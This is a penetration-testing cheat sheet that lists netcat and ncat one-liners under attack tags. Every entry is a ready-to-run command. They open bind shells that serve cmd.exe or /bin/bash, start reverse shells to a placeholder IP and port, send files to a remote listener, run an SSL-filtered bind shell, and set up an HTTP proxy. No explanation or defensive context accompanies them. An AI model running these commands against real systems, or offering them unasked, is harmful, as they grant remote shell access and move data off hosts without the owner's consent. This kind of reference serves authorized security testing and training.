# netcat

% nc, netcat

#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 
## nc setup listener
```
nc -nlvp <lport>
```

## nc bind shell windows
#plateform/windows 
```
nc -nlvp <port> -e cmd.exe
```

## nc bind shell linux
```
nc -nlvp <port> -e /bin/bash
```

## nc reverse shell windows
#plateform/windows  #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <ip> <port> -e cmd.exe
```

## nc reverse shell linux
#cat/ATTACK/REVERSE_SHELL 
```
nc -nv <ip> <port> -e /bin/bash
```

## nc transfert file - receiver
#cat/ATTACK/FILE_TRANSFERT 
```
nc -nlvp <port> > <incomming_file>
```

## nc transfert file - sender
#cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <ip> <port> < <file_to_send>
```

# ncat

% ncat

## ncat bind shell ssl filtered
#cat/ATTACK/LISTEN-SERVE 
```
ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
```

## ncat bind shell ssl connection
#cat/ATTACK/LISTEN-SERVE 
```
ncat -v <ip> <port> --ssl
```

## ncat HTTP WEB proxy
#cat/ATTACK/LISTEN-SERVE 
```
ncat --listen --proxy-type http <port>
```

